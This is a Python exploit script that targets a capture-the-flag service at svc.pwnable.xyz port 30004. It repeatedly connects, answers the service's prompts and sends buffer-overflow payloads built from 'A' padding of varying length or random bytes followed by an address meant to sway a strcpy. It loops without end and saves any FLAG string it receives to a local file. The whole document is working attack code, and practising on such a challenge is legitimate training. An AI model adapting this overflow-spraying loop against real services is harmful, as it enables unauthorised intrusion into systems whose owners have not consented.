#!/usr/bin/env python3
import socket
import sys
import time
import random
import os

HOST = "svc.pwnable.xyz"
PORT = 30004
TIMEOUT = 5.0
CYCLE_TIMEOUT = 35.0

def recv_until(sock, token: bytes, timeout=2.0):
	 sock.settimeout(timeout)
	 buf = b""
	 try:
		 while token not in buf:
			 data = sock.recv(4096)
			 if not data:
				 break
			 buf += data
	 except socket.timeout:
		 pass
	 return buf

# Variants of payload generators
def payloads():
	 base_addr = bytes([0x80, 0x10, 0x60, 0x00])
	 while True:
		 # 1) 0x80 A's + 3-4 addr bytes
		 yield b"A" * 0x80 + base_addr
		 yield b"A" * 0x80 + base_addr[:3] + b"\x00"
		 # 2) slightly shorter to influence strcpy scan
		 for pad in (0x7f, 0x7e, 0x7d, 0x70, 0x60):
			 yield b"A" * pad + base_addr
		 # 3) random fills
		 rnd_pad = random.randint(64, 128)
		 yield os.urandom(rnd_pad) + base_addr


def try_once(gen):
	 with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as s:
		 out = recv_until(s, b": ")
		 s.sendall(b"y\n")
		 out += recv_until(s, b"Name:")
		 p = next(gen)
		 s.sendall(p)
		 time.sleep(0.1)
		 out += recv_until(s, b"\n", timeout=2.0)
		 # try to slurp more
		 try:
			 s.settimeout(1.0)
			 more = s.recv(8192)
			 out += more
		 except socket.timeout:
			 pass
		 return out


def main():
	 gen = payloads()
	 end_by = time.time() + CYCLE_TIMEOUT
	 while time.time() < end_by:
		 try:
			 out = try_once(gen)
		 except Exception:
			 continue
		 if b"FLAG{" in out:
			 sys.stdout.buffer.write(out)
			 try:
				 flag = out.split(b"FLAG{")[1].split(b"}")[0]
			 except Exception:
				 break
			 with open("/workspace/reto_pwnable_xyz/grownup_50/flag.txt", "wb") as f:
				 f.write(b"FLAG{" + flag + b"}\n")
			 return
		 time.sleep(0.05)

if __name__ == "__main__":
	 while True:
		 main()
